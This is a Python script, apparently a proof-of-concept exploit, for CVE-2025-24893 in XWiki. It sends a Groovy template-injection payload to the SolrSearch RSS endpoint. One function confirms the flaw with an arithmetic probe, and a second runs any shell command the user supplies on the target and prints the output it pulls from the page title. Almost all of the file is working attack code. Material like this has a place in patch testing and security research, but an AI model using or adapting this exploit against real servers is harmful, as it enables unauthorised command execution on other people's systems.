#!/usr/bin/env python3
import requests
import sys
import urllib.parse
import re

def check_vulnerability(target_url):
    payload = '}}}{{async async=false}}{{groovy}}println("Hello from" + " search text:" + (23 + 19)){{/groovy}}{{/async}}'
    
    for path in ["/bin/get/Main/SolrSearch", "/xwiki/bin/get/Main/SolrSearch"]:
        vuln_url = f"{target_url}{path}"
        params = {
            "media": "rss",
            "text": payload
        }
        
        print(f"[*] Target: {target_url}")
        print(f"[*] Testing CVE-2025-24893 XWiki SolrSearch RCE...")
        print(f"[*] URL: {vuln_url}")
        
        try:
            response = requests.get(vuln_url, params=params, timeout=30, allow_redirects=False)
            
            if response.status_code == 302:
                location = response.headers.get('Location', '')
                if 'distribution' in location.lower():
                    print("[-] XWiki Distribution Wizard not completed. Please complete setup first.")
                    return False
            
            if "Hello from search text:42" in response.text:
                print("[+] VULNERABLE! Remote Code Execution confirmed.")
                print(f"[+] Response contains: 'Hello from search text:42'")
                return True
            elif "could not be found" in response.text.lower():
                print("[-] SolrSearchMacros page not found. XWiki Standard Flavor may not be installed.")
                continue
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Error connecting to target: {e}")
            continue
    
    print("[-] Target does not appear to be vulnerable or setup incomplete.")
    return False

def exploit_rce(target_url, command):
    groovy_payload = '}}}{{async async=false}}{{groovy}}println("' + command + '".execute().text){{/groovy}}{{/async}}'
    
    for path in ["/bin/get/Main/SolrSearch", "/xwiki/bin/get/Main/SolrSearch"]:
        vuln_url = f"{target_url}{path}"
        params = {
            "media": "rss",
            "text": groovy_payload
        }
        
        print(f"[*] Executing command: {command}")
        
        try:
            response = requests.get(vuln_url, params=params, timeout=30)
            
            title_match = re.search(r'<title>(.*?)</title>', response.text, re.DOTALL)
            if title_match:
                output = title_match.group(1).strip()
                if output and "SolrSearch" not in output:
                    print(f"[+] Command output:\n{output}")
                    return output
                    
        except requests.exceptions.RequestException as e:
            print(f"[-] Error: {e}")
            continue
    
    print("[-] Could not execute command")
    return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [command]")
        print(f"Example: {sys.argv[0]} http://localhost:18080")
        print(f"Example: {sys.argv[0]} http://localhost:18080 'id'")
        sys.exit(1)
    
    target = sys.argv[1].rstrip('/')
    
    if len(sys.argv) > 2:
        cmd = sys.argv[2]
        exploit_rce(target, cmd)
    else:
        check_vulnerability(target)
